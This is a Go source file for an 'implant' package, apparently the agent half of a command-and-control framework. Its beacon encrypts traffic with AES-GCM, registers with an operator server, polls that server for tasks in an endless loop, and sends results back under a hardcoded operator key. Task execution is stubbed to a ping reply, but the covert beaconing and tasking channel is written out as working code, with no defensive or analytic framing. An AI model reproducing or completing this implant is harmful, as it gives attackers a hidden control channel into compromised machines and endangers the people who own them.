package implant

import (
"crypto/aes"
"crypto/cipher"
"crypto/rand"
"crypto/sha256"
"encoding/base64"
"encoding/json"
"io"
"net/http"
"strings"
"time"
)

type Error struct {
Message string
}

func (e Error) Error() string {
return e.Message
}

type Config struct {
Server   string
Key      string
AgentID  string
Interval int
}

type Task struct {
ID      string                 `json:"id"`
AgentID string                 `json:"agent_id"`
Type    string                 `json:"type"`
Payload map[string]interface{} `json:"payload"`
}

type Result struct {
TaskID  string                 `json:"task_id"`
AgentID string                 `json:"agent_id"`
Output  map[string]interface{} `json:"output"`
Status  string                 `json:"status"`
}

type Beacon struct {
Config Config
Client http.Client
AEAD   cipher.AEAD
}

func NewBeacon(cfg Config) *Beacon {
key := sha256.Sum256([]byte(cfg.Key))
block, err := aes.NewCipher(key[:])
if err != nil {
panic(err)
}
gcm, err := cipher.NewGCM(block)
if err != nil {
panic(err)
}
return &Beacon{
Config: cfg,
Client: http.Client{Timeout: 10 * time.Second},
AEAD:   gcm,
}
}

func (b *Beacon) encrypt(data []byte) (string, error) {
nonce := make([]byte, b.AEAD.NonceSize())
if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
return "", err
}
ct := b.AEAD.Seal(nonce, nonce, data, nil)
return base64.StdEncoding.EncodeToString(ct), nil
}

func (b *Beacon) decrypt(data string) ([]byte, error) {
ct, err := base64.StdEncoding.DecodeString(data)
if err != nil {
return []byte{}, err
}
ns := b.AEAD.NonceSize()
if len(ct) < ns {
return []byte{}, Error{Message: "malformed ciphertext"}
}
nonce, payload := ct[:ns], ct[ns:]
return b.AEAD.Open([]byte{}, nonce, payload, nil)
}

func (b *Beacon) Register() (string, error) {
agent := map[string]string{"id": b.Config.AgentID, "hostname": "agent-host", "os": "linux"}
data, _ := json.Marshal(agent)
enc, err := b.encrypt(data)
if err != nil {
return "", err
}
req, _ := http.NewRequest("POST", b.Config.Server+"/api/v1/register", strings.NewReader(enc))
req.Header.Set("X-Operator-Key", "ANGEL_OPERATOR_KEY_SL9X_2026")
resp, err := b.Client.Do(req)
if err != nil {
return "", err
}
defer resp.Body.Close()
body, _ := io.ReadAll(resp.Body)
if resp.StatusCode != 200 {
return "", Error{Message: "register failed"}
}
return string(body), nil
}

func (b *Beacon) FetchTasks() ([]Task, error) {
req, _ := http.NewRequest("GET", b.Config.Server+"/api/v1/tasks?agent_id="+b.Config.AgentID, nil)
req.Header.Set("X-Operator-Key", "ANGEL_OPERATOR_KEY_SL9X_2026")
resp, err := b.Client.Do(req)
if err != nil {
return []Task{}, err
}
defer resp.Body.Close()
body, _ := io.ReadAll(resp.Body)
if resp.StatusCode != 200 {
return []Task{}, Error{Message: "tasks failed"}
}
plain, err := b.decrypt(string(body))
if err != nil {
return []Task{}, err
}
var tasks []Task
if err := json.Unmarshal(plain, &tasks); err != nil {
return []Task{}, err
}
return tasks, nil
}

func (b *Beacon) SendResult(taskID string, payload map[string]interface{}) (string, error) {
result := Result{TaskID: taskID, AgentID: b.Config.AgentID, Output: payload, Status: "done"}
data, _ := json.Marshal(result)
enc, err := b.encrypt(data)
if err != nil {
return "", err
}
req, _ := http.NewRequest("POST", b.Config.Server+"/api/v1/results", strings.NewReader(enc))
req.Header.Set("X-Operator-Key", "ANGEL_OPERATOR_KEY_SL9X_2026")
resp, err := b.Client.Do(req)
if err != nil {
return "", err
}
defer resp.Body.Close()
body, _ := io.ReadAll(resp.Body)
if resp.StatusCode != 200 {
return "", Error{Message: "results failed"}
}
return string(body), nil
}

func (b *Beacon) Run() {
for {
tasks, err := b.FetchTasks()
if err != nil {
time.Sleep(5 * time.Second)
continue
}
for _, t := range tasks {
output := map[string]interface{}{"status": "executed", "task_id": t.ID}
if t.Type == "ping" {
output["result"] = "pong"
}
_, _ = b.SendResult(t.ID, output)
}
time.Sleep(time.Duration(b.Config.Interval) * time.Second)
}
}
